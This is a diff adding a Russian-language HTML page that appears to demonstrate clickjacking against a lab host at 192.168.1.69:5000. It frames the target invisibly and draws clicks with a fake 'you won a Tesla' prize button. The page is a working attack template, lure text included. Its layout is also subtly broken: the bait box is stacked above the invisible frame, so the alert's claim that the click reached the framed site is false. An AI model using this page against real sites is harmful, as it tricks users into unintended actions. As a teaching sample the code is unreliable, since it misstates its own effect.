@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎉 ПОЗДРАВЛЯЕМ! 🎉</title>
+</head>
+<body style="margin:0; overflow:hidden">
+
+    <!-- Невидимый iframe с сайтом-жертвой -->
+    <iframe src="http://192.168.1.69:5000/" 
+            style="position:fixed; 
+                   top:0; 
+                   left:0; 
+                   width:100%; 
+                   height:100%; 
+                   border:none; 
+                   opacity:0">
+    </iframe>
+
+    <!-- Кнопка-приманка -->
+    <div style="position:fixed; 
+                top:50%; 
+                left:50%; 
+                transform:translate(-50%,-50%); 
+                text-align:center;
+                z-index:999;
+                background:white;
+                padding:30px;
+                border-radius:20px;
+                box-shadow:0 0 50px rgba(0,0,0,0.3)">
+        
+        <h1 style="color:red; font-size:48px;">🏆 ВЫ ВЫИГРАЛИ! 🏆</h1>
+        <p style="font-size:24px;">Автомобиль Tesla Model X</p>
+        <button id="prizeBtn" style="background:green; 
+                                     color:white; 
+                                     font-size:28px; 
+                                     padding:15px 40px; 
+                                     border:none; 
+                                     border-radius:50px; 
+                                     cursor:pointer">
+            🎁 ЗАБРАТЬ ПРИЗ 🎁
+        </button>
+        <p style="font-size:12px; color:gray; margin-top:20px;">Предложение действует 24 часа</p>
+    </div>
+
+    <script>
+        const btn = document.getElementById('prizeBtn');
+        
+        btn.addEventListener('click', function() {
+            // В реальной атаке тут ничего не пишут
+            // Но для демонстрации показываем:
+            alert('⚡ Clickjacking атака!\n\nВы кликнули по кнопке "Забрать приз",\nно реальный клик ушёл на сайт в iframe');
+        });
+        
+        console.log('💀 Атакующий сайт загружен');
+        console.log('Цель: http://192.168.1.69:5000/');
+    </script>
+</body>
+</html>
